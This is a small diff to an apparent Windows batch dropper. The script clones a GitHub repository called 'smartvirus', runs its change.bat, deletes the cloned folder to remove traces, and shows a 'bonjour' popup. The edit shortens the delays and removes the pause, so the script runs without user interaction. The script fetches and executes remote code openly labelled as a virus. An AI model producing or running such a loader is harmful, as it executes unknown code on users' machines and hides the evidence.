@@ -1,8 +1,8 @@
 git clone https://github.com/mattistjnn/smartvirus
 cd smartvirus
 Start change.bat
-timeout 10
+timeout 3
 cd ..
 rmdir /s /q smartvirus
-pause
+timeout 3
 msg * "bonjour"
